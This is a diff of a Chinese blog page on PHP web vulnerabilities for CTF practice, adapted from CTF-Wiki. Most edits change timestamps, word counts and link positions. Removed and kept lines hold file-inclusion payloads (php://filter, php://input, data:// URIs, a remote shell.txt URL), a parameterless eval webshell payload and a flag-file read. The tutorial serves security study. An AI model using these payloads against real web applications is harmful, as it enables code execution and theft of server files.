@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png">
 <meta property="article:published_time" content="2025-11-08T13:59:32.000Z">
-<meta property="article:modified_time" content="2025-12-28T12:02:36.769Z">
+<meta property="article:modified_time" content="2026-01-11T01:52:56.427Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k 字
+          3.7k 字
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          33 分钟
+          31 分钟
         
       </span>
     
@@ -305,7 +305,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年12月28日 晚上
+                    本文最后更新于 2026年1月11日 上午
                   
                 
               </p>
@@ -367,8 +367,6 @@
 <p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
 </li>
 </ul>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinghaihe/p/18416524">本地文件包含漏洞详解与CTF实战 </a></p>
-<p><a href="/html/taishan.html">伪协议过滤绕过</a></p>
 <h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;share&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_share.php&quot;</span>;<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;sharelink&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_sharelink.php&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>构造变量 <code>basePath</code> 的值。</p>
@@ -379,34 +377,9 @@
 
 <p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
 <p><img src="https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li><p>普通远程文件包含</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=[<span class="hljs-keyword">http</span>|<span class="hljs-keyword">https</span>|<span class="hljs-keyword">ftp</span>]://example.com/<span class="hljs-built_in">shell</span>.txt<br></code></pre></td></tr></table></figure>
-
-<p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p>
-</li>
-<li><p>利用 PHP 流 input</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
-
-<p>需要 <code>allow_url_include=On</code> 。</p>
-</li>
-<li><p>利用 PHP 流 filter</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
-
-<p>需要 <code>allow_url_include=On</code> 。</p>
-</li>
-<li><p>利用 data URIs</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,SSBsb3ZlIFBIUAo=<br></code></pre></td></tr></table></figure>
-
-<p>需要 <code>allow_url_include=On</code> 。</p>
-</li>
-<li><p>利用 XSS 执行</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/path/</span>xss.php?xss=phpcode<br></code></pre></td></tr></table></figure>
-
-<p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p>
-</li>
-</ul>
 <p><a target="_blank" rel="noopener" href="https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><strong>PHP伪协议详解</strong></a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinghaihe/p/18416524">本地文件包含漏洞详解与CTF实战 </a></p>
+<p><a href="/html/taishan.html">伪协议过滤绕过</a></p>
 <h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h3><p>PHP 中有不少可以直接执行代码的函数。</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>();<br><span class="hljs-built_in">assert</span>();<br><span class="hljs-built_in">system</span>();<br><span class="hljs-built_in">exec</span>();<br><span class="hljs-built_in">shell_exec</span>();<br><span class="hljs-built_in">passthru</span>();<br><span class="hljs-built_in">escapeshellcmd</span>();<br><span class="hljs-built_in">pcntl_exec</span>();<br>......<br></code></pre></td></tr></table></figure>
 
@@ -537,7 +510,7 @@
 <p>攻击 payload</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.a.com/index.php?callback=phpinfo</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>[在这儿呢](<a href="https://www.sunynov.top/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞 - suny</a>)</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><a href="https://www.sunynov.top/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">在这儿呢</a></p>
 <h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;string&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
@@ -597,13 +570,8 @@
 <h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>无参🐎</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">phpinfo</span>();</span><br></code></pre></td></tr></table></figure>
 
-<p>显示另一个文件</p>
-<ul>
-<li>include，require</li>
-<li>highlight_file(glob(“&#x2F;f*”)[0])</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-preg_match.html">preg_match() 函数</a></p>
-<p>[strpos() 函数](<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-strpos.html">PHP strpos() 函数 | 菜鸟教程</a>)</p>
+
+
 <p class="note note-success">本文摘自CTF-Wiki，原文基础上有改动</p>
 
                 
